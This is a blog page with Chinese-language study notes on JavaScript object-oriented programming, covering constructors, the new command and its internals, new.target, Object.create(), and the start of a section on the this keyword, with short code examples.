<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://example.com/page/16/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
  
<meta name="generator" content="Hexo 7.3.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
        
          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
        
        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-03.面向对象" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/pages/659b5af5e2e704e0" class="article-date">
  <time class="dt-published" datetime="2020-01-12T03:49:16.000Z" itemprop="datePublished">2020-01-12</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E3%80%8AJavaScript%E6%95%99%E7%A8%8B%E3%80%8B%E7%AC%94%E8%AE%B0/">《JavaScript教程》笔记</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/pages/659b5af5e2e704e0">面向对象</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="面向对象编程"><a href="#面向对象编程" class="headerlink" title="面向对象编程"></a>面向对象编程</h1><h2 id="一、实例对象与new命令"><a href="#一、实例对象与new命令" class="headerlink" title="一、实例对象与new命令"></a>一、实例对象与new命令</h2><h3 id="1、对象是什么"><a href="#1、对象是什么" class="headerlink" title="1、对象是什么"></a>1、对象是什么</h3><p>面向对象编程（Object Oriented Programming，缩写为 OOP）是目前主流的编程范式。它将真实世界各种复杂的关系，抽象为一个个对象，然后由对象之间的分工与合作，完成对真实世界的模拟。</p>
<p>每一个对象都是<strong>功能中心</strong>，具有明确分工，可以完成<strong>接受信息、处理数据、发出信息</strong>等任务。对象<strong>可以复用</strong>，通过继承机制还<strong>可以定制</strong>。因此，面向对象编程具有<strong>灵活、代码可复用、高度模块化</strong>等特点，容易维护和开发，比起由一系列函数或指令组成的传统的<strong>过程式编程</strong>（procedural programming），更适合多人合作的<strong>大型软件项目</strong>。</p>
<p>那么，“对象”（object）到底是什么？我们从两个层次来理解。</p>
<p><strong>（1）对象是单个实物的抽象。</strong></p>
<p>一本书、一辆汽车、一个人都可以是对象，一个数据库、一张网页、一个与远程服务器的连接也可以是对象。当<strong>实物被抽象成对象，实物之间的关系就变成了对象之间的关系，从而就可以模拟现实情况，针对对象进行编程。</strong></p>
<p><strong>（2）对象是一个容器，封装了属性（property）和方法（method）。</strong></p>
<p><strong>属性</strong>是对象的状态，<strong>方法</strong>是对象的行为（完成某种任务）。比如，我们可以把动物抽象为<code>animal</code>对象，使用“属性”记录具体是那一种动物，使用“方法”表示动物的某种行为（奔跑、捕猎、休息等等）。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> person = &#123; <span class="comment">// 对象</span></span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;张三&#x27;</span>, <span class="comment">// 属性</span></span><br><span class="line">    <span class="attr">interest</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123; <span class="comment">// 方法(行为)</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">name</span> + <span class="string">&#x27;正在喝酒&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">person.<span class="title function_">interest</span>() <span class="comment">// 张三正在喝酒</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 真实世界： 有一个人，名字叫张三，他正在喝酒。</span></span><br><span class="line"><span class="comment">// 对象模拟： 一个人抽象为一个对象person，对象是一个容器，内部封装了属性name叫张三，他正在喝酒封装成方法interest</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="2、构造函数"><a href="#2、构造函数" class="headerlink" title="2、构造函数"></a>2、构造函数</h3><p>面向对象编程的第一步，就是要生成对象。前面说过，对象是单个实物的抽象。通常需要一个模板，表示某一类实物的共同特征，然后对象根据这个模板生成。</p>
<p>典型的面向对象编程语言（比如 C++ 和 Java），都有“类”（class）这个概念。所谓“类”就是对象的模板，对象就是“类”的实例。但是，JavaScript 语言的对象体系，不是基于“类”的，而是<strong>基于构造函数（constructor）和原型链（prototype）</strong>。</p>
<p>JavaScript 语言<strong>使用构造函数（constructor）作为对象的模板</strong>。</p>
<p><strong>所谓”构造函数”，就是专门用来生成实例对象的函数</strong>。</p>
<p>它就是对象的模板，描述实例对象的基本结构。</p>
<p>一个构造函数，可以生成多个实例对象，这些实例对象都有相同的结构。</p>
<p>构造函数就是一个普通的函数，但是有自己的特征和用法。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="title class_">Vehicle</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">price</span> = <span class="number">1000</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>Vehicle</code>就是构造函数。为了与普通函数区别，构造函数名字的第一个字母通常大写。</p>
<p>构造函数的特点有两个。</p>
<ul>
<li>函数体内部使用了<code>this</code>关键字，代表了所要生成的对象实例。</li>
<li>生成对象的时候，必须使用<code>new</code>命令。</li>
</ul>
<p>下面先介绍<code>new</code>命令。</p>
<h3 id="3、new命令"><a href="#3、new命令" class="headerlink" title="3、new命令"></a>3、new命令</h3><h4 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h4><p> <code>new</code>命令的作用：<strong>执行构造函数，返回一个实例对象</strong>。 </p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="title class_">Vehicle</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">price</span> = <span class="number">1000</span>; <span class="comment">// this指向实例对象v</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> v = <span class="keyword">new</span> <span class="title class_">Vehicle</span>();  <span class="comment">// new 执行一个构造函数，返回一个实例对象给v</span></span><br><span class="line">v.<span class="property">price</span> <span class="comment">// 1000</span></span><br></pre></td></tr></table></figure>

<p>上面代码通过<code>new</code>命令，让构造函数<code>Vehicle</code>生成一个实例对象，保存在变量<code>v</code>中。这个新生成的实例对象，从构造函数<code>Vehicle</code>得到了<code>price</code>属性。<code>new</code>命令执行时，构造函数内部的<code>this</code>，就代表了新生成的实例对象，<code>this.price</code>表示实例对象有一个<code>price</code>属性，值是1000。 </p>
<p> 使用<code>new</code>命令时，根据需要，<strong>构造函数也可以接受参数</strong>。 </p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="title class_">Vehicle</span> = <span class="keyword">function</span> (<span class="params">p</span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">price</span> = p;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> v = <span class="keyword">new</span> <span class="title class_">Vehicle</span>(<span class="number">500</span>); <span class="comment">// new 命令时，构造函数可以接受参数</span></span><br></pre></td></tr></table></figure>

<p><code>new</code>命令本身就可以执行构造函数，所以后面的构造函数可以带括号，也<strong>可以不带括号</strong>。下面两行代码是等价的，但是为了表示这里是函数调用，<strong>推荐使用括号</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 推荐的写法</span></span><br><span class="line"><span class="keyword">var</span> v = <span class="keyword">new</span> <span class="title class_">Vehicle</span>();</span><br><span class="line"><span class="comment">// 不推荐的写法</span></span><br><span class="line"><span class="keyword">var</span> v = <span class="keyword">new</span> <span class="title class_">Vehicle</span>;</span><br></pre></td></tr></table></figure>

<p>一个很自然的问题是，如果忘了使用<code>new</code>命令，直接调用构造函数会发生什么事？</p>
<p>这种情况下，构造函数就变成了普通函数，并不会生成实例对象。而且由于后面会说到的原因，<code>this</code>这时代表全局对象，将造成一些意想不到的结果。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="title class_">Vehicle</span> = <span class="keyword">function</span> (<span class="params"></span>)&#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">price</span> = <span class="number">1000</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> v = <span class="title class_">Vehicle</span>(); <span class="comment">// 忘记使用new命令，构造函数变成普通函数，不会生成实例，函数内部this指向window</span></span><br><span class="line">v <span class="comment">// undefined   函数为普通函数且没有返回值，所有v为undefined</span></span><br><span class="line">price <span class="comment">// 1000  函数内部this指向window， price变成全局属性，等价于window.price</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，调用<code>Vehicle</code>构造函数时，忘了加上<code>new</code>命令。结果，变量<code>v</code>变成了<code>undefined</code>，而<code>price</code>属性变成了全局变量。因此，应该非常小心，避免不使用<code>new</code>命令、直接调用构造函数。</p>
<p>为了保证构造函数必须与<code>new</code>命令一起使用，一个解决办法是，<strong>构造函数内部使用严格模式</strong>，即第一行加上<code>use strict</code>。这样的话，一旦忘了使用<code>new</code>命令，直接调用构造函数就会报错。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Fubar</span>(<span class="params">foo, bar</span>)&#123;</span><br><span class="line">  <span class="string">&#x27;use strict&#x27;</span>;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">_foo</span> = foo; <span class="comment">// 严格模式中this不能指向window对象，不加new调用this等于undefined，给undefined添加属性会报错</span></span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">_bar</span> = bar;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Fubar</span>()</span><br><span class="line"><span class="comment">// TypeError: Cannot set property &#x27;_foo&#x27; of undefined</span></span><br></pre></td></tr></table></figure>

<p> 上面代码的<code>Fubar</code>为构造函数，<code>use strict</code>命令保证了该函数在严格模式下运行。由于<strong>严格模式中，函数内部的<code>this</code>不能指向全局对象</strong>，默认等于<code>undefined</code>，导致不加<code>new</code>调用会报错（JavaScript 不允许对<code>undefined</code>添加属性）。 </p>
<p> <strong>另一个解决办法</strong>，构造函数内部判断是否使用<code>new</code>命令，如果发现没有使用，则直接返回一个实例对象。 </p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Fubar</span>(<span class="params">foo, bar</span>) &#123;</span><br><span class="line">  <span class="comment">// instanceof运算符用于检测构造函数的prototype属性是否出现在某个实例对象的原型链（），返回布尔值。</span></span><br><span class="line">  <span class="comment">// 语法： &lt;实例对象&gt; instanceof &lt;构造函数&gt;</span></span><br><span class="line">  <span class="keyword">if</span> (!(<span class="variable language_">this</span> <span class="keyword">instanceof</span> <span class="title class_">Fubar</span>)) &#123;  <span class="comment">// 或 使用 (!new.target) 判断是否使用new命令</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Fubar</span>(foo, bar);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">_foo</span> = foo;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">_bar</span> = bar;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Fubar</span>(<span class="number">1</span>, <span class="number">2</span>).<span class="property">_foo</span> <span class="comment">// 1</span></span><br><span class="line">(<span class="keyword">new</span> <span class="title class_">Fubar</span>(<span class="number">1</span>, <span class="number">2</span>)).<span class="property">_foo</span> <span class="comment">// 1</span></span><br></pre></td></tr></table></figure>

<p>上面代码中的构造函数，不管加不加<code>new</code>命令，都会得到同样的结果。</p>
<h4 id="new-命令的原理"><a href="#new-命令的原理" class="headerlink" title="new 命令的原理"></a>new 命令的原理</h4><p>使用<code>new</code>命令时，它后面的函数依次执行下面的步骤。</p>
<ol>
<li><p>创建一个空对象，作为将要返回的实例对象。</p>
</li>
<li><p>将这个空对象的原型，指向构造函数的<code>prototype</code>属性。</p>
</li>
<li><p>将这个空对象赋值给函数内部的<code>this</code>关键字。</p>
</li>
<li><p>开始执行构造函数内部的代码。（代码中this指向空对象（实例对象））</p>
</li>
<li><p>返回实例对象（或自定义对象）</p>
</li>
</ol>
<p>也就是说，构造函数内部，<code>this</code>指的是一个新生成的空对象，<strong>所有针对<code>this</code>的操作，都会发生在这个空对象上</strong>。构造函数之所以叫“构造函数”，就是说这个函数的目的，就是操作一个空对象（即<code>this</code>对象），将其“构造”为需要的样子。 </p>
<p>如果构造函数内部有<code>return</code>语句，而且<code>return</code>后面跟着一个对象，<code>new</code>命令会返回<code>return</code>语句指定的对象；否则，就会不管<code>return</code>语句，返回<code>this</code>对象。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="title class_">Vehicle</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">price</span> = <span class="number">1000</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1000</span>; <span class="comment">// 1000 非对象，被忽略，返回的是this对象；如果是return &#123;&#125;，则会返回&#123;&#125;</span></span><br><span class="line">    </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">(<span class="keyword">new</span> <span class="title class_">Vehicle</span>()) === <span class="number">1000</span></span><br><span class="line"><span class="comment">// false</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，构造函数<code>Vehicle</code>的<code>return</code>语句返回一个数值。这时，<code>new</code>命令就会忽略这个<code>return</code>语句，返回“构造”后的<code>this</code>对象。</p>
<p>但是，如果<code>return</code>语句返回的是一个跟<code>this</code>无关的新对象，<code>new</code>命令会返回这个新对象，而不是<code>this</code>对象。这一点需要特别引起注意。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="title class_">Vehicle</span> = <span class="keyword">function</span> (<span class="params"></span>)&#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">price</span> = <span class="number">1000</span>;</span><br><span class="line">  <span class="keyword">return</span> &#123; <span class="attr">price</span>: <span class="number">2000</span> &#125;; <span class="comment">// return的是一个对象，会被返回出去。</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">(<span class="keyword">new</span> <span class="title class_">Vehicle</span>()).<span class="property">price</span></span><br><span class="line"><span class="comment">// 2000</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，构造函数<code>Vehicle</code>的<code>return</code>语句，返回的是一个新对象。<code>new</code>命令会返回这个对象，而不是<code>this</code>对象。</p>
<p>另一方面，如果对普通函数（内部没有<code>this</code>关键字的函数）使用<code>new</code>命令，则会返回一个空对象。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">getMessage</span>(<span class="params"></span>) &#123; <span class="comment">// 内部沒有this关键字，会返回一个空对象</span></span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;this is a message&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> msg = <span class="keyword">new</span> <span class="title function_">getMessage</span>();</span><br><span class="line"></span><br><span class="line">msg <span class="comment">// &#123;&#125;</span></span><br><span class="line"><span class="keyword">typeof</span> msg <span class="comment">// &quot;object&quot;</span></span><br></pre></td></tr></table></figure>

<p> 上面代码中，<code>getMessage</code>是一个普通函数，返回一个字符串。对它使用<code>new</code>命令，会得到一个空对象。这是因为**<code>new</code>命令总是返回一个对象，要么是实例对象，要么是<code>return</code>语句指定的对象**。本例中，<code>return</code>语句返回的是字符串，所以<code>new</code>命令就忽略了该语句。 </p>
<p><code>new</code>命令简化的内部流程，可以用下面的代码表示。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 构造函数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Person</span>(<span class="params">name,age</span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = name</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">age</span> = age</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 自定义_new</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">_new</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="comment">// 将 arguments 对象转为数组</span></span><br><span class="line">  <span class="keyword">var</span> args = [].<span class="property">slice</span>.<span class="title function_">call</span>(<span class="variable language_">arguments</span>);</span><br><span class="line">  <span class="comment">// 取出构造函数</span></span><br><span class="line">  <span class="keyword">var</span> constructor = args.<span class="title function_">shift</span>();</span><br><span class="line">  <span class="comment">// 创建一个空对象，继承构造函数的 prototype 属性</span></span><br><span class="line">  <span class="keyword">var</span> context = <span class="title class_">Object</span>.<span class="title function_">create</span>(constructor.<span class="property"><span class="keyword">prototype</span></span>);</span><br><span class="line">  <span class="comment">// 执行构造函数</span></span><br><span class="line">  <span class="keyword">var</span> result = constructor.<span class="title function_">apply</span>(context, args);</span><br><span class="line">  <span class="comment">// 如果返回结果是对象，就直接返回，否则返回 context 对象</span></span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">typeof</span> result === <span class="string">&#x27;object&#x27;</span> &amp;&amp; result != <span class="literal">null</span>) ? result : context;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 自定义_new2</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">_new2</span>(<span class="params"><span class="comment">/* 构造函数 */</span> constructor, <span class="comment">/* 构造函数参数 */</span> params</span>) &#123;</span><br><span class="line">  <span class="comment">// 创建一个空对象，继承构造函数的 prototype 属性</span></span><br><span class="line">  <span class="keyword">var</span> context = <span class="title class_">Object</span>.<span class="title function_">create</span>(constructor.<span class="property"><span class="keyword">prototype</span></span>);</span><br><span class="line">  <span class="comment">// 执行构造函数</span></span><br><span class="line">  <span class="keyword">var</span> result = constructor.<span class="title function_">apply</span>(context, params);</span><br><span class="line">  <span class="comment">// 如果返回结果是对象，就直接返回，否则返回 context 对象</span></span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">typeof</span> result === <span class="string">&#x27;object&#x27;</span> &amp;&amp; result != <span class="literal">null</span>) ? result : context;</span><br><span class="line">  <span class="comment">// （当用户在构造函数内部自定义返回对象的话则使用该对象，否则返回context）</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过自定义_new 返回实例</span></span><br><span class="line"><span class="keyword">var</span> actor = <span class="title function_">_new</span>(<span class="title class_">Person</span>, <span class="string">&#x27;张三&#x27;</span>, <span class="number">28</span>);</span><br><span class="line">actor.<span class="property">name</span> <span class="comment">// 张三</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过自定义_new2 返回实例</span></span><br><span class="line"><span class="keyword">var</span> actor2 = <span class="title function_">_new2</span>(<span class="title class_">Person</span>, [<span class="string">&#x27;李四&#x27;</span>, <span class="number">29</span>]);</span><br><span class="line">actor2.<span class="property">name</span> <span class="comment">// 李四</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过new命令 返回实例</span></span><br><span class="line"><span class="keyword">var</span> actor3 = <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&#x27;王五&#x27;</span>,<span class="number">30</span>)</span><br><span class="line">actor3.<span class="property">name</span> <span class="comment">// 王五</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="new-target-属性"><a href="#new-target-属性" class="headerlink" title="new.target 属性"></a>new.target 属性</h4><p>构造函数内部可以使用<code>new.target</code>属性。如果当前函数是<code>new</code>命令调用，<code>new.target</code><strong>指向当前函数</strong>，否则为<code>undefined</code>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">f</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">new</span>.<span class="property">target</span> === f);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">f</span>() <span class="comment">// false</span></span><br><span class="line"><span class="keyword">new</span> <span class="title function_">f</span>() <span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<p>使用这个属性，可以<strong>判断函数调用的时候，是否使用<code>new</code>命令</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">f</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="keyword">new</span>.<span class="property">target</span>) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;请使用 new 命令调用！&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">f</span>() <span class="comment">// Uncaught Error: 请使用 new 命令调用！</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，构造函数<code>f</code>调用时，没有使用<code>new</code>命令，就抛出一个错误。</p>
<h3 id="4、Object-create-创建实例对象"><a href="#4、Object-create-创建实例对象" class="headerlink" title="4、Object.create()创建实例对象"></a>4、Object.create()创建实例对象</h3><p>构造函数作为模板，可以生成实例对象。但是，有时拿不到构造函数，只能拿到一个现有的对象。我们希望以这个现有的对象作为模板，生成新的实例对象，这时就可以使用<code>Object.create()</code>方法。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 这个例子没有构造函数，只有一个对象</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> person1 = &#123; <span class="comment">// 这个对象用来生成实例对象，它被当成一个模板</span></span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;张三&#x27;</span>,</span><br><span class="line">  <span class="attr">age</span>: <span class="number">38</span>,</span><br><span class="line">  <span class="attr">greeting</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Hi! I\&#x27;m &#x27;</span> + <span class="variable language_">this</span>.<span class="property">name</span> + <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> person2 = <span class="title class_">Object</span>.<span class="title function_">create</span>(person1);</span><br><span class="line"></span><br><span class="line">person2.<span class="property">name</span> <span class="comment">// 张三</span></span><br><span class="line">person2.<span class="title function_">greeting</span>() <span class="comment">// Hi! I&#x27;m 张三.</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，对象<code>person1</code>是<code>person2</code>的模板，后者继承了前者的属性和方法。</p>
<p><code>Object.create()</code>的详细介绍，请看后面的相关章节。</p>
<h2 id="二、this关键字"><a href="#二、this关键字" class="headerlink" title="二、this关键字"></a>二、this关键字</h2><h3 id="1、涵义"><a href="#1、涵义" class="headerlink" title="1、涵义"></a>1、涵义</h3><p><code>this</code>关键字是一个非常重要的语法点。毫不夸张地说，不理解它的含义，大部分开发任务都无法完成。</p>
<p>前一章已经提到，<code>this</code>可以用在构造函数之中，表示实例对象。除此之外，<code>this</code>还可以用在别的场合。但不管是什么场合，<code>this</code>都有一个共同点：<strong>它总是返回一个对象</strong>。</p>
<p>简单说，**<code>this</code>就是属性或方法“当前”所在的对象**。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">this</span>.<span class="property">property</span> <span class="comment">// this代表property属性当前所在的对象</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>this</code>就代表<code>property</code>属性当前所在的对象。</p>
<p>下面是一个实际的例子。</p>
